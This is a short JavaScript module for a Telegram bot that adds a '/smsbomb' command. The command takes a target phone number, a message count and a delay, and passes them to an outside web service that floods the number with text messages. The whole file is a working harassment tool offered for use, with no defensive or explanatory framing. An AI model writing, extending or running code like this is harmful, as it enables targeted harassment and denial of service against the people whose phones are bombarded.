const axios = require('axios');

module.exports = (bot) => {
  // Command to initiate an SMS bombing
  bot.onText(/\/smsbomb (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const params = match[1].split(' ');

    if (params.length !== 3) {
      bot.sendMessage(chatId, 'Usage: /smsbomb <number> <amount> <delay>');
      return;
    }

    const [number, amount, delay] = params;

    try {
      bot.sendMessage(chatId, `Initiating SMS bomb on ${number} with ${amount} messages and ${delay}ms delay...`);

      const response = await axios.get(`https://joshweb.click/smsb?number=${encodeURIComponent(number)}&amount=${encodeURIComponent(amount)}&delay=${encodeURIComponent(delay)}`);

      if (response.data.success) {
        bot.sendMessage(chatId, `SMS bomb initiated successfully on ${number}.`);
      } else {
        bot.sendMessage(chatId, `Failed to initiate SMS bomb on ${number}.`);
      }
    } catch (error) {
      console.error('Error initiating SMS bomb:', error.message || error);
      bot.sendMessage(chatId, 'Error initiating SMS bomb.');
    }
  });
};
